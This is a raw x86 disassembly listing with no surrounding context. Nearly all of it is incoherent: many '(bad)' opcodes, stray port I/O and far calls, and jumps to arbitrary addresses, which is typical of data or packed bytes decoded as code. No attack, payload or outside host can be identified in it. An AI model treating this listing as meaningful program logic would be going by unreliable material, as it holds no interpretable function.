  405ed7:	add    eax,0xb19df078
  405edc:	jl     0x405e86
  405ede:	imul   edi,DWORD PTR [edx],0xffffff96
  405ee1:	not    BYTE PTR [eax+0x13]
  405ee4:	fdiv   QWORD PTR [esi-0x2246a825]
  405eea:	test   BYTE PTR [esi],al
  405eec:	inc    ecx
  405eed:	lock pop ebp
  405eef:	std    
  405ef0:	stc    
  405ef1:	jb     0x405e9d
  405ef3:	int3   
  405ef4:	inc    ebx
  405ef5:	inc    ecx
  405ef6:	pusha  
  405ef7:	sub    edx,0xffffffab
  405efa:	or     ch,BYTE PTR [eax-0x6a]
  405efd:	icebp  
  405efe:	test   eax,0x1e09c46a
  405f03:	ins    DWORD PTR es:[edi],dx
  405f04:	pop    ebx
  405f05:	push   ss
  405f06:	sub    edi,edi
  405f08:	inc    edx
  405f09:	mov    ebp,0xa28a9811
  405f0e:	mov    al,0x6f
  405f10:	and    cl,bh
  405f12:	inc    ebp
  405f13:	inc    edx
  405f14:	mov    eax,0x9fe85460
  405f19:	add    al,0xee
  405f1b:	fwait
  405f1c:	call   0x67f71579
  405f21:	jae    0x405edf
  405f23:	add    DWORD PTR [eax],ecx
  405f25:	pop    DWORD PTR [edx+edi*1-0x329be9]
  405f2c:	(bad)  
  405f2d:	mov    esp,esi
  405f2f:	ja     0x405f79
  405f31:	sub    esi,DWORD PTR [edx+0x6b89d930]
  405f37:	fs push ebx
  405f39:	scas   al,BYTE PTR es:[edi]
  405f3a:	clc    
  405f3b:	inc    eax
  405f3c:	push   ecx
  405f3d:	cmp    eax,0x9ca61cb2
  405f42:	add    ebp,DWORD PTR [edi+0x27eeea82]
  405f48:	arpl   WORD PTR [ecx],si
  405f4a:	jmp    0x405f05
  405f4c:	dec    esp
  405f4d:	inc    edx
  405f4e:	shr    DWORD PTR [esi],1
  405f50:	mov    ebx,0xde0cccc
  405f55:	jl     0x405f52
  405f57:	xor    BYTE PTR [esp+esi*8],bl
  405f5a:	clc    
  405f5b:	cmc    
  405f5c:	enter  0x6407,0x8
  405f60:	sub    DWORD PTR [ebx+ebp*8],0x20b707f3
  405f67:	dec    edi
  405f68:	or     DWORD PTR [ecx+edx*4+0xe],0xffffff9b
  405f6d:	xor    esi,DWORD PTR [ebx-0x44ceb1b4]
  405f73:	xchg   ebp,esi
  405f75:	jbe    0x405feb
  405f77:	clc    
  405f78:	icebp  
  405f79:	not    DWORD PTR [edi+0x1]
  405f7c:	fst    QWORD PTR [edi-0x7d1cfded]
  405f82:	cwde   
  405f83:	arpl   si,bx
  405f85:	mov    bh,0x85
  405f87:	push   edx
  405f88:	add    BYTE PTR [ebx+ecx*1],dh
  405f8b:	test   DWORD PTR [ecx-0x4],ecx
  405f8e:	dec    edx
  405f8f:	push   edi
  405f90:	or     esp,edi
  405f92:	stos   DWORD PTR es:[edi],eax
  405f93:	mov    dh,0x5f
  405f95:	imul   DWORD PTR [ebp+esi*8+0x3e2ad869]
  405f9c:	das    
  405f9d:	xor    edx,edi
  405f9f:	push   es
  405fa0:	out    0x8e,eax
  405fa2:	mov    al,ds:0x506e62b2
  405fa7:	shr    DWORD PTR [ebp-0x3d0ff769],1
  405fad:	jl     0x405f36
  405faf:	sub    dl,BYTE PTR [esi-0x77]
  405fb2:	ror    bl,cl
  405fb4:	lea    esp,[ecx+0x32]
  405fb7:	int    0x65
  405fb9:	lahf   
  405fba:	(bad)  
  405fbb:	jmp    0xedccaf18
  405fc0:	popa   
  405fc1:	int3   
  405fc2:	stos   DWORD PTR es:[edi],eax
  405fc3:	inc    ebx
  405fc4:	test   eax,0x97a95321
  405fc9:	les    eax,FWORD PTR [ebx+0x3ed1d40d]
  405fcf:	sub    eax,0x5a49c610
  405fd4:	jle    0x406034
  405fd6:	mov    bl,ch
  405fd8:	mov    ebp,0xd90fb4bc
  405fdd:	mov    eax,ds:0x54a2b532
  405fe2:	(bad)  [bx-0x7148]
  405fe7:	sar    edi,cl
  405fe9:	repnz aam 0xf3
  405fec:	or     esi,DWORD PTR [ebp+0x61691483]
  405ff2:	xchg   esp,eax
  405ff3:	pcmpeqd mm4,QWORD PTR [ecx]
  405ff6:	loopne 0x405fcf
  405ff8:	xchg   edi,eax
  405ff9:	sub    DWORD PTR [ecx-0x1c],edi
  405ffc:	add    al,0x34
  405ffe:	jp     0x405fa2
  406000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406001:	sub    DWORD PTR [esi-0x35df9b33],edx
  406007:	lock mov esi,0x2f0cc4d7
  40600d:	popf   
  40600e:	mov    edx,?
  406010:	ja     0x406003
  406012:	lock add eax,0xa9a6f19f
  406018:	das    
  406019:	imul   edi,DWORD PTR [edi],0xffffffc7
  40601c:	and    BYTE PTR [ecx+0x31],ch
  40601f:	scas   eax,DWORD PTR es:[edi]
  406020:	call   0x31d40aa9
  406025:	xchg   esp,eax
  406026:	push   edi
  406027:	cmp    DWORD PTR [ecx-0x3321d9f0],edi
  40602d:	test   eax,0x7a4ff34e
  406032:	mov    DWORD PTR [esi],edi
  406034:	dec    esp
  406036:	in     al,dx
  406037:	jge    0x406007
  406039:	cmp    BYTE PTR [esi],al
  40603b:	repnz pop esp
  40603d:	push   cs
  40603e:	jle    0x406078
  406040:	push   cs
  406041:	adc    eax,0x7bd33546
  406046:	jle    0x406044
  406048:	(bad)  
  406049:	sbb    DWORD PTR ds:0xdaf66b60,edi
  40604f:	scas   al,BYTE PTR es:[edi]
  406050:	dec    esi
  406051:	cmp    ebx,DWORD PTR [ecx]
  406053:	and    al,0x75
  406055:	xor    ch,BYTE PTR [edi+0x18]
  406058:	xor    BYTE PTR ds:0x5061e13e,ch
  40605e:	xchg   ebx,eax
  40605f:	arpl   dx,dx
  406061:	test   eax,0x7c972eb3
  406066:	inc    edi
  406067:	add    edi,DWORD PTR [edx*2+0x1f3ce690]
  40606e:	inc    ebp
  40606f:	stos   DWORD PTR es:[edi],eax
  406070:	aas    
  406071:	pop    eax
  406072:	je     0x4060e0
  406074:	pop    esi
  406075:	inc    ecx
  406076:	sbb    dl,dl
  406078:	bound  ebp,QWORD PTR [edi+0x1d]
  40607b:	ficom  WORD PTR [ebp+0x7a22efb4]
  406081:	jnp    0x406022
  406083:	xor    DWORD PTR [ecx],0x86ba3b94
  406089:	dec    ebp
  40608a:	adc    edi,DWORD PTR [edx-0x2475e3e0]
  406090:	mov    ecx,0xfd8da890
  406095:	aaa    
  406096:	dec    esi
  406097:	push   esi
  406098:	scas   al,BYTE PTR es:[edi]
  406099:	dec    ecx
  40609a:	xor    DWORD PTR [edi],eax
  40609c:	mov    ds:0x2ca57601,eax
  4060a1:	out    0xbe,al
  4060a3:	repz enter 0x5fc9,0xf5
  4060a8:	fsub   QWORD PTR [edx+0x8e782ad]
  4060ae:	loopne 0x4060ef
  4060b0:	pop    edx
  4060b1:	scas   eax,DWORD PTR es:[edi]
  4060b2:	add    eax,0x95329946
  4060b7:	sbb    DWORD PTR [eax],edx
  4060b9:	jmp    0x4060bd
  4060bb:	int3   
  4060bc:	js     0x40609c
  4060be:	hlt    
  4060bf:	add    BYTE PTR [ecx+0x64],bl
  4060c2:	hlt    
  4060c3:	jo     0x4060ba
  4060c5:	push   ds
  4060c6:	sbb    al,0x7f
  4060c8:	mov    dl,0x0
  4060ca:	das    
  4060cb:	push   es
  4060cc:	dec    ebx
  4060cd:	push   0x25c57175
  4060d2:	ret    0x650e
  4060d5:	fdivr  QWORD PTR [ebp+0x70]
  4060d8:	dec    eax
  4060d9:	pop    es
  4060da:	es mov esi,0x31f22b12
  4060e0:	jmp    0x406136
  4060e2:	adc    eax,ebp
  4060e4:	in     al,dx
  4060e5:	jb     0x40609a
  4060e7:	std    
  4060e8:	popa   
  4060e9:	cs aam 0xc2
  4060ec:	cmc    
  4060ed:	add    al,0x99
  4060ef:	or     al,0xf
  4060f1:	xchg   ecx,eax
  4060f2:	xchg   esp,eax
  4060f3:	imul   ebx,DWORD PTR [ecx*1+0x7d304455],0x7a
  4060fb:	inc    eax
  4060fc:	imul   esi,eax,0x5f18b5df
  406102:	xchg   esi,eax
  406103:	or     ecx,ebx
  406105:	scas   eax,DWORD PTR es:[edi]
  406106:	adc    eax,0x271ecf81
  40610b:	test   al,0x10
  40610d:	(bad)  
  40610e:	clc    
  40610f:	adc    ebp,ecx
  406111:	fst    st(7)
  406113:	mov    dh,0x8a
  406115:	sub    al,0x76
  406117:	mov    bl,0xee
  406119:	add    bh,al
  40611b:	(bad)  
  40611c:	mov    eax,0x72545e50
  406121:	daa    
  406122:	mov    ebp,0xe156d831
  406127:	fdivr  QWORD PTR [edi+0x60]
  40612a:	push   ebx
  40612b:	shr    BYTE PTR ds:0x8714ada8,0x81
  406132:	test   eax,0xea8745c8
  406137:	jle    0x4061b5
  406139:	cmp    ebp,edx
  40613b:	adc    DWORD PTR [ecx+0x31],ebp
  40613e:	cmp    al,0xd
  406140:	mov    ss,WORD PTR [eax+0x46]
  406143:	push   ebp
  406144:	in     al,0x6d
  406146:	jns    0x406177
  406148:	and    BYTE PTR [ebx-0x4b31d3ee],dl
  40614e:	pop    ecx
  40614f:	popf   
  406150:	ins    BYTE PTR es:[edi],dx
  406151:	loop   0x40619a
  406153:	call   0x9566ba6b
  406158:	mov    cl,0x8e
  40615a:	aad    0x6c
  40615c:	jmp    0x406149
  40615e:	mov    dl,0x15
  406160:	xchg   edi,eax
  406161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406162:	adc    DWORD PTR [esi],edx
  406164:	out    dx,eax
  406165:	clc    
  406166:	repz (bad) 
  406168:	mov    ch,0xf5
  40616a:	(bad)  
  40616b:	cs clc 
  40616d:	hlt    
  40616e:	fdivr  st(6),st
  406170:	and    al,BYTE PTR [edx+edi*8-0x50]
  406174:	xor    esi,DWORD PTR [ebp+0x60ddd747]
  40617a:	in     eax,0x21
  40617c:	pop    edi
  40617e:	pusha  
  40617f:	test   DWORD PTR [ebx-0x1bf26b88],eax
  406185:	(bad)  
  406186:	adc    al,0x44
  406188:	retf   
  406189:	loope  0x4061a4
  40618b:	les    esi,FWORD PTR [ecx]
  40618d:	push   ss
  40618e:	int3   
  40618f:	bound  esi,QWORD PTR [ebx+eax*2+0x22]
  406193:	ins    BYTE PTR es:[edi],dx
  406194:	std    
  406195:	dec    esp
  406196:	or     eax,0xd97bdc70
  40619b:	add    eax,0xffffff99
  40619e:	repnz ins BYTE PTR es:[edi],dx
  4061a0:	mov    ah,0x4f
  4061a2:	or     eax,DWORD PTR [ebx+0x5]
  4061a5:	cmc    
  4061a6:	mov    ebp,0x19a5587d
  4061ab:	cmp    DWORD PTR [ebx+0x1e],edi
  4061ae:	aas    
  4061af:	fstp   QWORD PTR [esi+0x15]
  4061b2:	mov    WORD PTR [esi+0x15dcac41],es
  4061b8:	dec    esp
  4061b9:	jae    0x406218
  4061bb:	adc    eax,0x379f5ed1
  4061c0:	outs   dx,DWORD PTR ds:[esi]
  4061c1:	mov    ds:0x3deb718f,al
  4061c6:	push   cs
  4061c7:	mov    bl,0xfe
  4061c9:	shl    BYTE PTR [edi+0x21],1
  4061cc:	sahf   
  4061cd:	inc    edi
  4061ce:	popa   
  4061cf:	popa   
  4061d0:	aas    
  4061d1:	test   eax,0xe5155be4
  4061d6:	sbb    esp,ebp
  4061d8:	(bad)  
  4061d9:	jnp    0x40617b
  4061db:	lods   eax,DWORD PTR ds:[esi]
  4061dc:	mov    dl,0xb1
  4061de:	ror    BYTE PTR [edx-0x54437a3f],cl
  4061e4:	hlt    
  4061e5:	arpl   WORD PTR fs:[ecx],dx
  4061e8:	pop    esi
  4061e9:	in     al,0x4
  4061eb:	in     al,dx
  4061ec:	fwait
  4061ed:	hlt    
  4061ee:	hlt    
  4061ef:	mov    esi,0xe7b3a29b
  4061f4:	addr16 mov ebx,0x6c434589
  4061fa:	addr16 push edx
  4061fc:	lods   al,BYTE PTR ds:[esi]
  4061fd:	jno    0x40619a
  4061ff:	mov    esp,0xf5ac97
  406204:	add    al,0x1a
  406206:	sbb    eax,0xa798c56b
  40620b:	xchg   esp,eax
  40620c:	jp     0x4061b4
  40620e:	outs   dx,DWORD PTR ds:[esi]
  40620f:	and    ecx,DWORD PTR [esi-0xa]
  406212:	mov    edx,edx
  406214:	pop    ebx
  406215:	loopne 0x406205
  406217:	(bad)  
  406218:	std    
  406219:	pusha  
  40621a:	int    0xf8
  40621c:	push   ds
  40621d:	jne    0x4061a8
  40621f:	dec    ebx
  406220:	clc    
  406221:	nop
  406222:	ret    
  406223:	xchg   edi,eax
  406224:	pop    edi
  406225:	adc    bh,dh
  406227:	in     al,0x85
  406229:	mov    DWORD PTR [ebx],ecx
  40622b:	inc    edi
  40622c:	std    
  40622d:	adc    BYTE PTR [esi-0x66db5c43],0x8d
  406234:	test   eax,0x3bdf8e31
  406239:	dec    ebx
  40623a:	std    
  40623b:	mov    bl,0x5a
  40623d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40623e:	imul   ebx,DWORD PTR [esi+0x63],0xd9a4a76
  406245:	dec    ebx
  406246:	out    0x3e,al
  406248:	lahf   
  406249:	jae    0x40621b
  40624b:	fsubr  DWORD PTR [edi+0x2b]
  40624e:	xor    eax,0xf1cd12a9
  406253:	mov    bl,0x65
  406255:	aaa    
  406256:	xor    ebp,DWORD PTR [esi+0x589932dd]
  40625c:	sub    dl,al
  40625e:	shl    bh,1
  406260:	xor    edx,ebp
  406262:	repz scas eax,DWORD PTR es:[edi]
  406264:	push   es
  406265:	popa   
  406266:	jo     0x4062c5
  406268:	stc    
  406269:	cs dec eax
  40626b:	into   
  40626c:	out    0x87,al
  40626e:	mov    bl,0x8b
  406270:	outs   dx,BYTE PTR ds:[esi]
  406271:	pop    ebp
  406272:	out    dx,eax
  406273:	inc    edx
  406274:	inc    ebx
  406275:	xchg   ebp,eax
  406276:	mov    esp,0x31cef9ac
  40627b:	push   esp
  40627c:	out    0x9e,al
  40627e:	test   DWORD PTR [edi+ecx*1+0x7d],ecx
  406282:	inc    edx
  406283:	aas    
  406284:	xchg   edx,eax
  406285:	pushf  
  406286:	out    dx,eax
  406287:	lods   eax,DWORD PTR ds:[esi]
  406288:	fsubr  st(1),st
  40628a:	add    BYTE PTR [eax],ah
  40628c:	xor    edi,DWORD PTR [ebx+edi*4-0x57]
  406290:	pop    ebx
  406291:	dec    esp
  406292:	and    al,0x24
  406294:	mul    DWORD PTR [ebp-0x30c1e43b]
  40629a:	add    ecx,DWORD PTR [esp+eiz*2+0x2fae148f]
  4062a1:	fnstenv [ecx]
  4062a3:	cwde   
  4062a4:	sub    esi,edi
  4062a6:	dec    ecx
  4062a7:	jge    0x4062d1
  4062a9:	cli    
  4062aa:	jl     0x406305
  4062ac:	(bad)  
  4062ad:	out    0x69,al
  4062af:	sub    bl,BYTE PTR [eax]
  4062b1:	lea    ecx,[ebx]
  4062b3:	in     al,0x3d
  4062b5:	jns    0x40625b
  4062b7:	sub    BYTE PTR [eax],cl
  4062b9:	mov    ah,al
  4062bb:	sar    BYTE PTR [esp+edx*1+0x4e7c33b8],1
  4062c2:	call   0x1e61:0x7fd8566e
  4062c9:	gs pop edi
  4062cb:	adc    ebp,DWORD PTR [esi]
  4062cd:	mov    cl,0x34
  4062cf:	or     al,0x86
  4062d1:	sub    ch,BYTE PTR [ecx+0x797d7651]
  4062d7:	xchg   edx,eax
  4062d8:	loope  0x4062d0
  4062da:	pop    ds
  4062db:	mov    ebp,edi
  4062dd:	lea    esi,[edx]
  4062df:	loopne 0x40635d
  4062e1:	cwde   
  4062e2:	sbb    BYTE PTR [ecx],dh
  4062e4:	sub    BYTE PTR [ecx-0x35ff3ca4],bh
  4062ea:	fld    DWORD PTR [edx+eax*4]
  4062ed:	xlat   BYTE PTR ds:[ebx]
  4062ee:	mov    bh,0x1a
  4062f0:	ficom  DWORD PTR [edx+0x65]
  4062f3:	in     al,0x41
  4062f5:	add    bl,al
  4062f7:	cmp    eax,0x6e3ff95e
  4062fc:	jp     0x4062a3
  4062fe:	push   0x845db2ff
  406303:	jge    0x406365
  406305:	xchg   esi,eax
  406306:	jle    0x406320
  406308:	cdq    
  406309:	inc    edx
  40630a:	vunpcklpd xmm2,xmm1,xmm3
  40630e:	mov    DWORD PTR [ecx+0x33ca5dfa],ecx
  406314:	fisttp WORD PTR [ebx+0x33]
  406317:	and    ch,dh
  406319:	ret    
  40631a:	div    BYTE PTR [esp+ebp*1]
  40631d:	dec    esp
  40631e:	ins    BYTE PTR es:[edi],dx
  40631f:	mov    WORD PTR [esi-0x1c],?
  406322:	push   0x10
  406324:	or     bh,BYTE PTR [ecx+0x40]
  406327:	(bad)  [eax+0x71]
  40632a:	xchg   edi,eax
  40632b:	repz pushf 
  40632d:	dec    eax
  40632e:	and    bl,BYTE PTR [ebp-0x41]
  406331:	mov    eax,ds:0xe2be0325
  406336:	jge    0x4063a3
  406338:	arpl   WORD PTR [ecx-0x51],bx
  40633b:	pusha  
  40633c:	jmp    0x9e9d:0xdac39a90
  406343:	fld    TBYTE PTR [ecx-0x70]
  406346:	sbb    al,BYTE PTR [edx-0x4a]
  406349:	sub    eax,0xe03b7ee3
  40634e:	pop    ecx
  40634f:	jne    0x40631c
  406351:	cwde   
  406352:	shl    ebx,cl
  406354:	popa   
  406355:	hlt    
  406356:	(bad)  
  406357:	in     al,0x5e
  406359:	(bad)  
  40635b:	sahf   
  40635c:	sub    BYTE PTR [ebp-0x42],al
  40635f:	clc    
  406360:	adc    ebx,ecx
  406362:	(bad)  
  406364:	jo     0x406306
  406366:	add    ecx,DWORD PTR [ebp-0x70]
  406369:	daa    
  40636a:	call   0xa965:0xd78beba9
  406371:	push   edx
  406372:	retf   
  406373:	rol    BYTE PTR [eax+eiz*8],0x68
  406377:	lahf   
  406378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406379:	in     al,0x3a
  40637b:	mov    edi,0x1d3af38b
  406380:	mov    eax,ds:0x167a5d10
  406385:	stos   DWORD PTR es:[edi],eax
  406386:	or     bh,BYTE PTR [ebp+0x23]
  406389:	inc    ebp
  40638a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40638b:	mov    ds:0xcfba1ae0,al
  406390:	xchg   esi,eax
  406391:	mov    esi,0xa0d4a9fd
  406396:	fild   WORD PTR [eax]
  406398:	cmp    al,0xc8
  40639a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40639b:	cmp    DWORD PTR [edi],eax
  40639d:	cmp    cl,BYTE PTR [eax+0x33]
  4063a0:	ss adc al,0xb1
  4063a3:	jle    0x40638c
  4063a5:	sbb    BYTE PTR [eax+0x7df0e15a],ch
  4063ab:	xchg   ebx,eax
  4063ac:	dec    edi
  4063ad:	adc    eax,0x8f5d299f
  4063b2:	xor    bl,BYTE PTR [edx-0x74]
  4063b5:	loope  0x406351
  4063b7:	jae    0x4063a7
  4063b9:	(bad)  
  4063ba:	out    0x88,al
  4063bc:	pop    ebp
  4063bd:	cmp    BYTE PTR [esi-0x3ae2afc],dh
  4063c3:	inc    ebx
  4063c4:	adc    edi,ebp
  4063c6:	sub    DWORD PTR [ecx-0x5585866b],0x74c06250
  4063d0:	mov    bl,0xde
  4063d2:	push   ds
  4063d3:	stc    
  4063d4:	cmp    ebp,DWORD PTR [ebx-0xa67500b]
  4063da:	and    ch,bh
  4063dc:	mov    WORD PTR [edi+0x27],ds
  4063df:	retf   0xf49d
  4063e2:	xor    ch,BYTE PTR [edx]
  4063e4:	mov    ds,esi
  4063e6:	je     0x406418
  4063e8:	xor    BYTE PTR [eax+0xd],0x3d
  4063ec:	repz sar eax,cl
  4063ef:	dec    ebx
  4063f0:	in     eax,dx
  4063f1:	push   0x30
  4063f3:	(bad)  
  4063f4:	sbb    eax,0x2f4b87cd
  4063f9:	ds repz int3 
  4063fc:	in     al,0xd0
  4063fe:	scas   al,BYTE PTR es:[edi]
  4063ff:	setns  dh
  406402:	or     al,0x29
  406404:	push   cs
  406405:	enter  0x17f2,0x2b
  406409:	or     BYTE PTR [eiz*2+0x60e64db2],bh
  406410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406411:	sahf   
  406412:	or     BYTE PTR [edx+0x3722abfa],al
  406418:	hlt    
  406419:	fist   DWORD PTR [ebp-0x28]
  40641c:	pop    es
  40641d:	gs cs je 0x4063d8
  406421:	stos   BYTE PTR es:[edi],al
  406422:	pop    ds
  406423:	aam    0xb6
  406425:	arpl   WORD PTR [ebp+0xb],sp
  406428:	(bad)  
  406429:	call   0xda08c2d8
  40642e:	sbb    DWORD PTR [eax],eax
  406430:	xor    dh,BYTE PTR [edi]
  406432:	xchg   ecx,eax
  406433:	neg    esp
  406435:	ins    DWORD PTR es:[edi],dx
  406436:	retf   0x3336
  406439:	(bad)  [eax]
  40643b:	sahf   
  40643c:	mov    ds:0x8640ee06,eax
  406441:	inc    eax
  406442:	ins    BYTE PTR es:[edi],dx
  406443:	in     eax,0xfa
  406445:	popf   
  406446:	into   
  406447:	jmp    0x9a68:0x58c248b9
  40644e:	mov    al,cl
  406450:	pop    ecx
  406451:	cld    
  406452:	lahf   
  406453:	out    dx,al
  406454:	outs   dx,DWORD PTR ds:[esi]
  406455:	pop    esi
  406456:	fdivr  QWORD PTR [ecx+0x1b]
  406459:	dec    edi
  40645a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40645c:	sbb    bl,BYTE PTR [eax+0x7a]
  40645f:	cmp    BYTE PTR [edi+esi*1+0x35],0x7d
  406464:	ja     0x406445
  406466:	jmp    0x40642a
  406468:	add    bl,ah
  40646a:	xchg   ebp,eax
  40646b:	out    0x0,al
  40646d:	pop    ss
  40646e:	or     edi,0xc8f78e99
  406474:	push   ebx
  406475:	pushf  
  406476:	adc    BYTE PTR [edi+0x48991823],0x51
  40647d:	pop    edi
  40647e:	adc    al,0xf9
  406480:	mov    edx,0xab871bff
  406485:	sbb    al,0xac
  406487:	sbb    al,0x63
  406489:	lods   eax,DWORD PTR ds:[esi]
  40648a:	clc    
  40648b:	les    edx,FWORD PTR [ebx]
  40648d:	cld    
  40648e:	pushf  
  40648f:	cdq    
  406490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406491:	int3   
  406492:	icebp  
  406493:	test   al,0x79
  406496:	cmc    
  406497:	push   0xe9b80712
  40649c:	inc    esi
  40649d:	call   0x2045:0xb76ef8b5
  4064a4:	rcr    DWORD PTR ds:0xc1b318fa,cl
  4064aa:	and    eax,0x465d052e
  4064af:	arpl   WORD PTR [ecx-0x346063c8],sp
  4064b5:	loope  0x406478
  4064b7:	stos   BYTE PTR es:[edi],al
  4064b8:	inc    edx
  4064b9:	lods   al,BYTE PTR ds:[esi]
  4064ba:	test   DWORD PTR [esp+eax*8+0x4a],0xed28b59d
  4064c2:	jge    0x40652c
  4064c4:	lds    ecx,FWORD PTR [ebp+0x26]
  4064c7:	nop
  4064c8:	add    esp,DWORD PTR [ebp+0x14370a5]
  4064ce:	pushf  
  4064cf:	(bad)  
  4064d0:	fstp   st(5)
  4064d2:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064d4:	gs sbb cl,bl
  4064d7:	int3   
  4064d8:	inc    esi
  4064d9:	jmp    0x4064f2
  4064db:	call   0x5714:0xcea8ffa7
  4064e2:	jge    0x4064ec
  4064e4:	addr16 sbb eax,0xf6d6d58d
  4064ea:	lds    ebx,FWORD PTR [eax]
  4064ec:	and    al,0xe8
  4064ee:	rol    BYTE PTR [eax-0x579f3894],cl
  4064f4:	rcl    edi,1
  4064f6:	std    
  4064f7:	add    al,0xc2
  4064f9:	cmp    ah,dh
  4064fb:	xor    al,0xa
  4064fd:	pop    edi
  4064fe:	retf   0x5761
  406501:	add    DWORD PTR [edi-0xb5416a],edi
  406507:	(bad)  
  406508:	ror    DWORD PTR [eax],cl
  40650a:	pop    esi
  40650b:	mov    edi,0x566baf8e
  406510:	inc    esp
  406511:	jno    0x40649f
  406513:	mov    ch,0x92
  406515:	xchg   edx,eax
  406516:	xchg   esp,eax
  406517:	ret    0x490d
  40651a:	push   edi
  40651b:	cmp    bl,ch
  40651d:	fwait
  40651e:	enter  0x5017,0xb7
  406522:	inc    esp
  406523:	cmc    
  406524:	cmp    al,BYTE PTR [ebp+ebx*2+0x143e3b37]
  40652b:	out    0x80,eax
  40652d:	cli    
  40652e:	and    BYTE PTR [eax],0x26
  406531:	aad    0xb5
  406533:	test   DWORD PTR ds:0x4f5f3456,ebp
  406539:	sub    bl,BYTE PTR [edx]
  40653b:	cmp    al,BYTE PTR [ebx+0x1847f18a]
  406541:	mov    al,ds:0xf6bb9216
  406546:	mov    ds:0x5a8ab97d,eax
  40654b:	cwde   
  40654c:	out    dx,eax
  40654d:	xchg   edx,eax
  40654e:	mov    DWORD PTR [edi],edx
  406550:	mov    eax,ds:0x8d60d8d7
  406555:	sub    bh,BYTE PTR [esi]
  406557:	mov    eax,0xd8342a2c
  40655c:	pushf  
  40655d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40655e:	popa   
  40655f:	pop    ebx
  406560:	push   esp
  406561:	out    0x29,al
  406563:	fwait
  406564:	lock ds or al,0x45
  406568:	(bad)  
  406569:	in     al,dx
  40656a:	inc    edi
  40656b:	adc    al,BYTE PTR [ebx+0x2cc93d80]
  406571:	stos   DWORD PTR es:[edi],eax
  406572:	xchg   ebx,esi
  406574:	sbb    DWORD PTR [edi-0xf3e7955],eax
  40657a:	retf   
  40657b:	mov    WORD PTR [eax-0x3143bd1c],?
  406581:	int    0x22
  406583:	ja     0x406521
  406585:	or     bh,dl
  406587:	mov    edi,0x51980038
  40658c:	iret   
  40658d:	(bad)  
  40658e:	(bad)  
  406590:	mov    ds:0xecbc3f6d,eax
  406595:	xor    eax,0x43092a2d
  40659a:	mov    ch,bh
  40659c:	hlt    
  40659d:	data16 cli 
  40659f:	and    al,0x71
  4065a1:	or     al,0x61
  4065a3:	mov    bl,0xdb
  4065a5:	lea    esp,[ebx+0x44]
  4065a8:	push   cs
  4065a9:	sbb    eax,0x149dc751
  4065ae:	and    al,0x91
  4065b0:	(bad)  
  4065b1:	mov    bh,0xe3
  4065b3:	sbb    DWORD PTR [ecx-0x63302647],esi
  4065b9:	gs mov ah,0x23
  4065bc:	jo     0x40660e
  4065be:	dec    ebp
  4065bf:	mov    DWORD PTR [edi+0x53],ebx
  4065c2:	dec    edi
  4065c3:	shl    edi,cl
  4065c5:	arpl   WORD PTR [eax-0x5e],di
  4065c8:	mov    ss,WORD PTR [edi+esi*8-0x6]
  4065cc:	mov    cs,WORD PTR [edi+0x70]
  4065cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065d0:	in     al,0xa4
  4065d2:	pop    edi
  4065d3:	pop    ebx
  4065d4:	dec    eax
  4065d5:	xor    eax,0xd582c976
  4065da:	dec    ebx
  4065db:	aas    
  4065dc:	and    esi,DWORD PTR [ecx]
  4065de:	push   edi
  4065df:	and    DWORD PTR [ebp+0x1f],0xffffffe0
  4065e3:	cld    
  4065e4:	stc    
  4065e5:	xchg   edx,eax
  4065e6:	mov    esp,0x9c2bdc12
  4065eb:	jb     0x406623
  4065ed:	not    ebp
  4065ef:	or     edi,DWORD PTR [esi-0x21afaebc]
  4065f5:	push   ds
  4065f6:	aam    0xaa
  4065f8:	jno    0x406581
  4065fa:	pop    edi
  4065fb:	mov    WORD PTR ds:0x496c2237,fs
  406601:	clc    
  406602:	iret   
  406603:	outs   dx,BYTE PTR gs:[esi]
  406605:	les    esp,FWORD PTR [ebp+0x6]
  406608:	ds scas al,BYTE PTR es:[edi]
  40660a:	mov    esp,0x841e5d30
  40660f:	ins    DWORD PTR es:[edi],dx
  406610:	adc    ch,dh
  406612:	pop    es
  406613:	loopne 0x4065eb
  406615:	push   ecx
  406616:	dec    eax
  406617:	fwait
  406618:	rol    BYTE PTR [edx+esi*1],1
  40661b:	push   ds
  40661c:	lds    edx,FWORD PTR [ebx-0x5f81afb4]
  406622:	jmp    0x406681
  406624:	mov    dl,0x9e
  406626:	popf   
  406627:	push   ecx
  406628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406629:	mov    ah,0x69
  40662b:	inc    edx
  40662c:	sub    al,0xf2
  40662e:	cwde   
  40662f:	push   edi
  406630:	dec    ebx
  406631:	jmp    0xf0a49730
  406636:	dec    ecx
  406637:	sub    bh,dh
  406639:	hlt    
  40663a:	inc    eax
  40663b:	mov    bl,dh
  40663d:	scas   eax,DWORD PTR es:[edi]
  40663e:	mov    ebp,0x8163c1be
  406643:	jnp    0x4065ef
  406645:	or     eax,0xfa14d1c9
  40664a:	push   0xffffff8c
  40664c:	add    cl,BYTE PTR [ebp-0x821bcfb]
  406652:	add    esi,DWORD PTR [eax+ecx*1]
  406655:	nop
  406656:	out    dx,eax
  406657:	adc    al,0xc3
  406659:	pop    ecx
  40665a:	mov    al,ds:0x96df9810
  40665f:	jl     0x406632
  406661:	adc    BYTE PTR [eax],0x4f
  406664:	test   al,0xb0
  406666:	ror    DWORD PTR [esi+0x76af079f],cl
  40666c:	mov    ah,0xae
  40666e:	pushf  
  40666f:	loope  0x4065f3
  406671:	test   DWORD PTR [ebx],ebx
  406673:	ss adc eax,ecx
  406676:	mov    ebp,edx
  406678:	(bad)  
  406679:	sbb    al,ah
  40667b:	bnd jno 0x40660f
  40667e:	pop    ss
  40667f:	push   edi
  406680:	cli    
  406681:	inc    esi
  406682:	mov    edx,0x93414138
  406687:	jl     0x40669b
  406689:	stos   DWORD PTR es:[edi],eax
  40668a:	or     BYTE PTR [edi],dl
  40668c:	jl     0x406685
  40668e:	mov    BYTE PTR [esi-0x8],ah
